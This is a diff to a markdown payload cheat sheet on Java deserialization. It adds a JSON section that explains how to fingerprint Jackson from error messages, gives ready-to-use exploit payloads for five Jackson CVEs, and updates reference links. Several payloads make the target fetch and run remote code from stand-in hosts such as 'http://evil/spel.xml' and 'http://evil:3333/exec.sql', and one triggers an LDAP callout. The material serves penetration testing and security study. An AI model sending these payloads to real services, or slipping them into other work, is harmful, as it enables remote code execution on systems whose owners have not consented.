@@ -130,7 +130,101 @@ Payload generators for the following marshallers are included:
 | XStream                         | **JDK only RCEs** |
 | YAMLBeans                       | third party RCE |
 
+## JSON Deserialization
+
+Multiple libraries can be used to handle JSON in Java.
+
+* [json-io](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#json-io-json)
+* [Jackson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)
+* [Fastjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#fastjson-json)
+* [Genson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)
+* [Flexjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#flexjson-json)
+* [Jodd](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jodd-json)
+
+**Jackson**:
+
+Jackson is a popular Java library used for working with JSON (JavaScript Object Notation) data.
+Jackson-databind supports Polymorphic Type Handling (PTH), formerly known as "Polymorphic Deserialization", which is disabled by default.
+
+To determine if the backend is using Jackson, the most common technique is to send an invalid JSON and inspect the error message. Look for references to either of those:
+
+```java
+Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
+```
+
+* com.fasterxml.jackson.databind
+* org.codehaus.jackson.map
+
+**Exploitation**:
+
+* **CVE-2017-7525**
+
+  ```json
+  {
+    "param": [
+      "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+      {
+        "transletBytecodes": [
+          "yv66v[JAVA_CLASS_B64_ENCODED]AIAEw=="
+        ],
+        "transletName": "a.b",
+        "outputProperties": {}
+      }
+    ]
+  }
+    ```
+
+* **CVE-2017-17485**
+
+  ```json
+  {
+    "param": [
+      "org.springframework.context.support.FileSystemXmlApplicationContext",
+      "http://evil/spel.xml"
+    ]
+  }
+  ```
+
+* **CVE-2019-12384**
+
+  ```json
+  [
+    "ch.qos.logback.core.db.DriverManagerConnectionSource", 
+    {
+      "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"
+    }
+  ]
+  ```
+
+* **CVE-2020-36180**
+
+  ```json
+  [
+    "org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS",
+    {
+      "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil:3333/exec.sql'"
+    }
+  ]
+  ```
+
+* **CVE-2020-9548**
+
+    ```json
+    [
+      "br.com.anteros.dbcp.AnterosDBCPConfig",
+      {
+        "healthCheckRegistry": "ldap://{{interactsh-url}}"
+      }
+    ]
+    ```
+
 ## YAML Deserialization
+
+* [SnakeYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#snakeyaml-yaml)
+* [jYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jyaml-yaml)
+* [YamlBeans](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#yamlbeans-yaml)
+
+**SnakeYAML**:
 
 SnakeYAML is a popular Java-based library used for parsing and emitting YAML (YAML Ain't Markup Language) data. It provides an easy-to-use API for working with YAML, a human-readable data serialization standard commonly used for configuration files and data exchange.
 
@@ -204,15 +298,18 @@ Common secrets from the [documentation](https://cwiki.apache.org/confluence/disp
 ## References
 
 * [Detecting deserialization bugs with DNS exfiltration - Philippe Arteau - March 22, 2017](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
+* [Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill - October 4, 2017](https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/)
 * [Hack The Box - Arkham - 0xRick - August 10, 2019](https://0xrick.github.io/hack-the-box/arkham/)
 * [How I found a $1500 worth Deserialization vulnerability - Ashish Kunwar - August 28, 2018](https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
 * [Jackson CVE-2019-12384: anatomy of a vulnerability class - Andrea Brancaleoni - July 22, 2019](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
+* [Jackson gadgets - Anatomy of a vulnerability - Andrea Brancaleoni - 22 Jul 2019](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
+* [Jackson Polymorphic Deserialization - FasterXML - July 23, 2020](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization)
+* [Java Deserialization Cheat Sheet - Aleksei Tiurin - May 23, 2023](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)
 * [Java Deserialization in ViewState - Haboob Team - December 23, 2020](https://www.exploit-db.com/docs/48126)
-* [Java-Deserialization-Cheat-Sheet - Aleksei Tiurin - May 23, 2023](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)
 * [JSF ViewState upside-down - Renaud Dubourguais, Nicolas Collignon - March 15, 2016](https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf)
 * [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Peter Stöckli - August 14, 2017](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
-* [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Peter Stöckli - August 14, 2017](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
-* [On Jackson CVEs: Don’t Panic — Here is what you need to know - cowtowncoder - December 22, 2017](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96)
+* [On Jackson CVEs: Don’t Panic — Here is what you need to know - cowtowncoder - December 22, 2017](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)
 * [Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin (@artsploit) - June 29, 2021](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
 * [Triggering a DNS lookup using Java Deserialization - paranoidsoftware.com - July 5, 2020](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
 * [Understanding & practicing java deserialization exploits - Diablohorn - September 9, 2017](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)
+* [Friday the 13th JSON Attacks - Alvaro Muñoz & Oleksandr Mirosh - July 28, 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
